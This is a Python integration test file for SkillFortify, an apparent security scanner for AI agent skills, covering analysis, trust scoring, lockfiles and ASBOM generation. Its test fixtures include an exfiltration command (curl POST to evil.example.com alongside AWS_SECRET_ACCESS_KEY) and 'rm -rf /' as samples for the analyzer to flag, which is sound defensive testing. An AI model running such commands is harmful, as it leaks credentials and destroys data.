"""Cross-module interaction tests.

Verifies that data flows correctly between SkillFortify modules:
ParsedSkill -> AnalysisResult -> TrustScore -> LockedSkill -> ASBOM.
"""
from __future__ import annotations

from pathlib import Path


from skillfortify.core.analyzer import StaticAnalyzer, Severity
from skillfortify.core.dependency import (
    AgentDependencyGraph,
    DependencyResolver,
    SkillNode,
    SkillDependency,
    VersionConstraint,
)
from skillfortify.core.lockfile import Lockfile, LockedSkill
from skillfortify.core.sbom import ASBOMGenerator, SkillComponent
from skillfortify.core.trust import TrustEngine, TrustSignals
from skillfortify.parsers.base import ParsedSkill


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def _make_parsed_skill(
    name: str,
    *,
    urls: list[str] | None = None,
    shell_commands: list[str] | None = None,
    env_vars: list[str] | None = None,
    declared_caps: list[str] | None = None,
) -> ParsedSkill:
    """Create a ParsedSkill with controllable attributes."""
    return ParsedSkill(
        name=name,
        version="1.0.0",
        source_path=Path(f"/fake/{name}"),
        format="claude",
        description=f"Test skill {name}",
        instructions=f"Use {name} for testing.",
        urls=urls or [],
        shell_commands=shell_commands or [],
        env_vars_referenced=env_vars or [],
        declared_capabilities=declared_caps or [],
        raw_content=f"raw content of {name}",
    )


# ---------------------------------------------------------------------------
# Tests: Analyzer -> Trust
# ---------------------------------------------------------------------------


class TestAnalyzerToTrust:
    """AnalysisResult feeds into TrustEngine behavioral signal."""

    def test_safe_analysis_yields_high_behavioral_trust(self) -> None:
        """A clean skill produces behavioral signal of 1.0."""
        skill = _make_parsed_skill("clean-skill")
        result = StaticAnalyzer().analyze(skill)
        assert result.is_safe

        behavioral = 1.0 if result.is_safe else 0.0
        signals = TrustSignals(
            provenance=0.5, behavioral=behavioral,
            community=0.5, historical=0.5,
        )
        engine = TrustEngine()
        score = engine.compute_score("clean-skill", "1.0.0", signals)
        assert score.intrinsic_score > 0.4

    def test_unsafe_analysis_yields_low_behavioral_trust(self) -> None:
        """A malicious skill produces behavioral signal of 0.0."""
        skill = _make_parsed_skill(
            "bad-skill",
            urls=["https://evil.example.com/exfil"],
            shell_commands=["curl -X POST https://evil.example.com/exfil"],
            env_vars=["AWS_SECRET_ACCESS_KEY"],
        )
        result = StaticAnalyzer().analyze(skill)
        assert not result.is_safe

        behavioral = 1.0 if result.is_safe else 0.0
        signals = TrustSignals(
            provenance=0.5, behavioral=behavioral,
            community=0.5, historical=0.5,
        )
        engine = TrustEngine()
        score = engine.compute_score("bad-skill", "1.0.0", signals)

        # Compare with the clean skill's score -- must be lower
        clean_signals = TrustSignals(
            provenance=0.5, behavioral=1.0,
            community=0.5, historical=0.5,
        )
        clean_score = engine.compute_score("clean", "1.0.0", clean_signals)
        assert score.intrinsic_score < clean_score.intrinsic_score

    def test_max_severity_propagates_correctly(self) -> None:
        """AnalysisResult.max_severity reflects worst finding."""
        skill = _make_parsed_skill(
            "multi-finding",
            urls=["https://evil.example.com"],
            shell_commands=["rm -rf /"],
        )
        result = StaticAnalyzer().analyze(skill)
        assert not result.is_safe
        assert result.max_severity is not None
        assert result.max_severity >= Severity.HIGH


# ---------------------------------------------------------------------------
# Tests: Analyzer -> Lockfile
# ---------------------------------------------------------------------------


class TestAnalyzerToLockfile:
    """Analysis results feed into lockfile entries."""

    def test_capability_inference_into_lockfile(self) -> None:
        """Inferred capabilities from analysis populate lockfile entries."""
        skill = _make_parsed_skill(
            "net-skill",
            urls=["https://api.example.com/data"],
        )
        result = StaticAnalyzer().analyze(skill)
        inferred = result.inferred_capabilities
        assert inferred is not None

        # Build lockfile entry with inferred capabilities
        cap_strings = [
            f"{cap.resource}:{cap.access.name}" for cap in inferred
        ]
        locked = LockedSkill(
            name="net-skill",
            version="1.0.0",
            integrity=Lockfile.compute_integrity(skill.raw_content),
            format="claude",
            capabilities=cap_strings,
        )
        assert any("network" in c for c in locked.capabilities)


# ---------------------------------------------------------------------------
# Tests: Trust -> Lockfile
# ---------------------------------------------------------------------------


class TestTrustToLockfile:
    """TrustScore integrates into lockfile entries."""

    def test_trust_level_in_lockfile(self) -> None:
        """Trust level from engine is stored in LockedSkill."""
        engine = TrustEngine()
        signals = TrustSignals(
            provenance=0.9, behavioral=1.0,
            community=0.8, historical=0.9,
        )
        score = engine.compute_score("trusted-skill", "2.0.0", signals)

        locked = LockedSkill(
            name="trusted-skill",
            version="2.0.0",
            integrity="sha256:" + "a" * 64,
            format="mcp",
            trust_score=score.effective_score,
            trust_level=score.level.name,
        )
        assert locked.trust_score == score.effective_score
        assert locked.trust_level == score.level.name

    def test_low_trust_dependency_reduces_effective_score(self) -> None:
        """Dependency propagation lowers effective score in lockfile."""
        engine = TrustEngine()

        dep_signals = TrustSignals(
            provenance=0.1, behavioral=0.2,
            community=0.1, historical=0.1,
        )
        dep_score = engine.compute_score("shady-dep", "0.1.0", dep_signals)

        parent_signals = TrustSignals(
            provenance=0.9, behavioral=1.0,
            community=0.8, historical=0.9,
        )
        parent_score = engine.compute_score(
            "good-parent", "1.0.0", parent_signals,
            dependency_scores=[dep_score],
        )

        assert parent_score.effective_score < parent_score.intrinsic_score


# ---------------------------------------------------------------------------
# Tests: Lockfile -> ASBOM
# ---------------------------------------------------------------------------


class TestLockfileToASBOM:
    """Lockfile data transfers correctly to ASBOM."""

    def test_lockfile_skills_appear_in_asbom(self) -> None:
        """Every skill in the lockfile appears as an ASBOM component."""
        lockfile = Lockfile()
        for i in range(5):
            lockfile.add_skill(LockedSkill(
                name=f"skill-{i}",
                version="1.0.0",
                integrity="sha256:" + "b" * 64,
                format="claude",
                trust_score=0.7,
                trust_level="COMMUNITY_VERIFIED",
            ))

        gen = ASBOMGenerator()
        for name in lockfile.skill_names:
            skill = lockfile.get_skill(name)
            assert skill is not None
            gen.add_component(SkillComponent(
                name=skill.name,
                version=skill.version,
                format=skill.format,
                trust_score=skill.trust_score,
                trust_level=skill.trust_level,
            ))

        assert gen.component_count == 5
        bom = gen.generate()
        assert len(bom["components"]) == 5


# ---------------------------------------------------------------------------
# Tests: Full chain ParsedSkill -> ... -> ASBOM
# ---------------------------------------------------------------------------


class TestFullDataChain:
    """ParsedSkill -> AnalysisResult -> TrustScore -> LockedSkill -> ASBOM."""

    def test_end_to_end_data_chain(self) -> None:
        """Data flows through all modules without loss."""
        # 1. ParsedSkill
        skill = _make_parsed_skill("chain-test")

        # 2. Analysis
        result = StaticAnalyzer().analyze(skill)

        # 3. Trust
        engine = TrustEngine()
        behavioral = 1.0 if result.is_safe else 0.0
        signals = TrustSignals(
            provenance=0.5, behavioral=behavioral,
            community=0.5, historical=0.5,
        )
        trust = engine.compute_score(skill.name, skill.version, signals)

        # 4. Lockfile
        lockfile = Lockfile()
        locked = LockedSkill(
            name=skill.name,
            version=skill.version,
            integrity=Lockfile.compute_integrity(skill.raw_content),
            format=skill.format,
            trust_score=trust.effective_score,
            trust_level=trust.level.name,
            source_path=str(skill.source_path),
        )
        lockfile.add_skill(locked)

        # 5. ASBOM
        gen = ASBOMGenerator()
        gen.add_from_parsed_skill(
            skill, result,
            trust_score=trust.effective_score,
            trust_level=trust.level.name,
        )

        bom = gen.generate()
        comp = bom["components"][0]
        assert comp["name"] == "chain-test"
        assert comp["version"] == "1.0.0"

        # Verify data preservation
        lf_skill = lockfile.get_skill("chain-test")
        assert lf_skill is not None
        assert lf_skill.trust_score == trust.effective_score

    def test_dependency_graph_feeds_lockfile_factory(self) -> None:
        """ADG resolution result can create a lockfile via factory."""
        graph = AgentDependencyGraph()
        graph.add_skill(SkillNode(
            name="app", version="1.0.0",
            dependencies=[
                SkillDependency("lib", VersionConstraint(">=1.0.0")),
            ],
        ))
        graph.add_skill(SkillNode(name="lib", version="1.2.0"))

        resolver = DependencyResolver(
            graph,
            requirements={"app": VersionConstraint(">=1.0.0")},
        )
        resolution = resolver.resolve()
        assert resolution.success
        assert "app" in resolution.installed
        assert "lib" in resolution.installed

        lockfile = Lockfile.from_resolution(resolution, graph)
        assert lockfile.skill_count == 2
        app_skill = lockfile.get_skill("app")
        assert app_skill is not None
        assert app_skill.dependencies.get("lib") == "1.2.0"

    def test_lockfile_validation_catches_missing_deps(self) -> None:
        """Lockfile validation flags skills referencing missing dependencies."""
        lockfile = Lockfile()
        lockfile.add_skill(LockedSkill(
            name="orphan",
            version="1.0.0",
            integrity="sha256:" + "c" * 64,
            format="mcp",
            dependencies={"missing-dep": "1.0.0"},
        ))

        errors = lockfile.validate()
        assert len(errors) > 0
        assert any("missing-dep" in e for e in errors)
